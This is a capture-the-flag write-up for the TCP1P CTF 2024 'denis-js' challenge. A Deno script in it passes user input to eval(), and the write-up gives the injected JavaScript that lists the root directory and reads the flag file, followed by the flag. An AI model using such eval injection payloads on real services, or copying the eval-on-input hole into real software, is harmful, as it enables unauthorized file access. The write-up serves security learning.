---
title: "denis-js Writeup"
date: 2024-10-17 22:00
categories: [TCP1P CTF 2024, Misc]
tags: [tcp1p, misc, javascript, deno]
authors: stefan
description: A Simple JavaScript challenge that uses Deno and evals user input. Read current directory and then the flag which was generated with random characters.
---

## Challenge Description

Hello guys, Denis just make a simple calculator in js, can you try it?

## Solution

### Step 1: Analyze the Given Script

We are provided with the following TypeScript code:

```ts
const { stdout, stdin } = Deno;

async function promptUserInput(message: string): Promise<string> {
    stdout.write(new TextEncoder().encode(message));
    const buffer = new Uint8Array(300);
    const bytesRead = await stdin.read(buffer);
    const userInput = new TextDecoder().decode(buffer.subarray(0, bytesRead));
    return userInput.trim();
}

promptUserInput("Enter your name: ").then(name=>{
    if (/^[a-zA-Z]{1,}$/g.test(name)) {
        stdout.write(new TextEncoder().encode("\\(OwO)/"));
        return
    }
    stdout.write(new TextEncoder().encode(eval(name)))
});
```

We can see that the script reads user input and evaluates it using `eval()`. If the input is a valid name, it prints `\(OwO)/`. Otherwise, it evaluates the input using `eval()` and prints the result.

### Step 2: Listing current directory

To read the contents of the current directory, we can use the `Deno.readDirSync()` function. This function returns an iterator of directory entries. We can then map these entries to their names and print them.

```js
console.log(Array.from(Deno.readDirSync('/')).map(entry => entry.name).join('\n'));
```

### Step 3: Reading the Flag

The flag is stored in a file named `/flag-e2fd2c5183e5da1e454fbe0f24dd4889`, discovered on the previous step. We can read this file using `Deno.readFileSync()`.

```js
try {
Deno.readFileSync("/flag-e2fd2c5183e5da1e454fbe0f24dd4889")
}catch(err) {console.log(err)}
```

This script successfully read the flag file and printed its contents.

## Conclusion

To summarize the steps we took:

1. We analyzed the given script and identified that it reads user input and evaluates it using `eval()`.
2. We used `Deno.readDirSync()` to list the contents of the current directory.
3. We read the flag file using `Deno.readFileSync()`.

## Flag
`TCP1P{h0PE_nAgi_dIdNT_SE3_I_U53_h1S_PAY1Oad_t0_5OLVe_tHI5_cH4LIEn9E}`
